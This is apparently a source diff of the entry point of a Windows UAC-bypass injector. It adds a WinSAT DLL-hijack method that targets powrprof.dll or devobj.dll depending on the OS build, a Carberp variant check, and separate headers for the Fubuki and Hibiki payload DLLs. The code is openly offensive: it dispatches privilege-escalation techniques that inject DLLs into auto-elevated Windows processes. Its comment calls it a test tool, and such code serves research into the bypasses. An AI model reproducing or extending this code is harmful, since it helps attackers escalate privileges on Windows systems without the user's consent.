@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.50
+*  VERSION:     1.60
 *
-*  DATE:        05 Apr 2015
+*  DATE:        20 Apr 2015
 *
 *  Injector entry point.
 *
@@ -20,11 +20,13 @@
 #include "global.h"
 
 #ifdef _WIN64
-#include "dll64.h"
+#include "hibiki64.h"
+#include "fubuki64.h"
 #define INJECTDLL Fubuki64
 #define AVRFDLL	Hibiki64
 #else
-#include "dll32.h"
+#include "hibiki32.h"
+#include "fubuki32.h"
 #define INJECTDLL Fubuki32
 #define AVRFDLL Hibiki32
 #endif
@@ -48,6 +50,7 @@ VOID main()
 {
 	BOOL					IsWow64 = FALSE;
 	DWORD					bytesIO, dwType;
+	WCHAR					*p;
 	WCHAR					szBuffer[MAX_PATH + 1];
 	TOKEN_ELEVATION_TYPE	ElevType;
 	RTL_OSVERSIONINFOW		osver;
@@ -74,7 +77,6 @@ VOID main()
 			PROGRAMTITLE, MB_ICONINFORMATION);
 		goto Done;
 	}
-
 
 	IsWow64 = supIsProcess32bit(GetCurrentProcess());
 
@@ -112,7 +114,7 @@ VOID main()
 			OutputDebugString(TEXT("[UCM] AppCompat\n\r"));
 
 #ifdef _WIN64
-			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY, 
+			MessageBox(GetDesktopWindow(), WOW64WIN32ONLY,
 				PROGRAMTITLE, MB_ICONINFORMATION);
 			goto Done;
 #endif
@@ -142,6 +144,11 @@ VOID main()
 		case METHOD_AVRF:
 			OutputDebugString(TEXT("[UCM] AVrf\n\r"));
 			break;
+
+		case METHOD_WINSAT:
+			OutputDebugString(TEXT("[UCM] WinSAT\n\r"));
+			break;
+
 		}
 	}
 
@@ -158,7 +165,7 @@ VOID main()
 		//
 #ifndef _DEBUG
 		if (IsWow64) {
-			MessageBoxW(GetDesktopWindow(),
+			MessageBox(GetDesktopWindow(),
 				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
 			goto Done;
 		}
@@ -185,7 +192,7 @@ VOID main()
 		//
 #ifndef _DEBUG
 		if (IsWow64) {
-			MessageBoxW(GetDesktopWindow(),
+			MessageBox(GetDesktopWindow(),
 				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
 			goto Done;
 		}
@@ -206,18 +213,29 @@ VOID main()
 		if (dwType == METHOD_CARBERP) {
 
 			if (osver.dwBuildNumber > 9600) {
-				MessageBoxW(GetDesktopWindow(),
+				MessageBox(GetDesktopWindow(),
 					TEXT("This method is only for Windows 7/8/8.1"), PROGRAMTITLE, MB_ICONINFORMATION);
 				goto Done;
 			}
 
 			//there is no migmiz in syswow64 in 8+
 			if ((IsWow64) && (osver.dwBuildNumber > 7601)) {
-				MessageBoxW(GetDesktopWindow(),
+				MessageBox(GetDesktopWindow(),
 					WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
 				goto Done;
 			}
 		}
+
+		if (dwType == METHOD_CARBERP_EX) {
+#ifndef _DEBUG
+			if (IsWow64) {
+				MessageBox(GetDesktopWindow(),
+					WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
+				goto Done;
+			}
+#endif
+		}
+
 
 		if (ucmWusaMethod(dwType, INJECTDLL, sizeof(INJECTDLL))) {
 			OutputDebugString(TEXT("[UCM] Carberp method called\n\r"));
@@ -227,7 +245,7 @@ VOID main()
 	case METHOD_AVRF:
 #ifndef _DEBUG
 		if (IsWow64) {
-			MessageBoxW(GetDesktopWindow(),
+			MessageBox(GetDesktopWindow(),
 				WOW64STRING, PROGRAMTITLE, MB_ICONINFORMATION);
 			goto Done;
 		}
@@ -237,6 +255,27 @@ VOID main()
 		}	
 		break;
 
+	case METHOD_WINSAT:
+		//
+		// Decoding WOW64 environment, turning wow64fs redirection is meeh. Just drop it as it just a test tool.
+		//
+		if (IsWow64) {
+			MessageBox(GetDesktopWindow(),
+				TEXT("Use 32 bit version of this tool on 32 bit OS version"), PROGRAMTITLE, MB_ICONINFORMATION);
+			goto Done;
+		}
+
+		if (osver.dwBuildNumber < 9200) {
+			p = L"powrprof.dll";
+		}
+		else {
+			p = L"devobj.dll";
+		}
+
+		if (ucmWinSATMethod(p, INJECTDLL, sizeof(INJECTDLL))) {
+			OutputDebugString(TEXT("[UCM] WinSAT method called\n\r"));
+		}
+		break;
 	}
 
 Done:
